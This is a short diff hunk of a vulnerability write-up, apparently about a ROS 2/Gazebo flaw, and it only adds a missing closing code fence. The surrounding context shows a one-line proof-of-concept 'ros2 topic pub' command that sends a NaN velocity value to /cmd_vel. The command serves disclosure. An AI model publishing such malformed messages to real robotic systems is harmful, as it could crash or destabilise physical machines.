@@ -22,6 +22,6 @@ An attacker can exploit this issue by publishing a crafted malformed `geometry_m
 
 ```bash
 ros2 topic pub /cmd_vel geometry_msgs/msg/Twist "{linear: {x: nan, y: 0.0, z: 0.0}, angular: {x: 0.0, y: 0.0, z: 0}}"
-
+```
 
 Test video: https://github.com/REYu6/ROS-vul/blob/main/Gazebo%20CVE/260328211736.mp4
